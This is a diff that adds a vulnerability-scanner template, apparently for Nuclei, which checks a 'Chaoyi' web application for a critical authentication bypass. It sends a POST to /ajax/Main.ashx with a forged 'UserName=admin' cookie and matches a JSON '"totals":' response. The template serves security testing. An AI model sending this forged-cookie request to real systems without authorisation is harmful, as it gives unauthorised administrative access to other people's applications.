@@ -1,0 +1,27 @@
+id: Chaoyi-cookie-Permission-Bypass
+info:
+  name: Chaoyi-cookie-Permission-Bypass
+  author: lemonlove7
+  severity: critical
+http:
+  - raw:
+      - |-
+        POST /ajax/Main.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0
+        Accept: application/json, text/ｊａｖａｓｃｒｉｐｔ, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+        Cookie: UserName=admin;
+        Content-Length: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"totals":'
+    matchers-condition: and
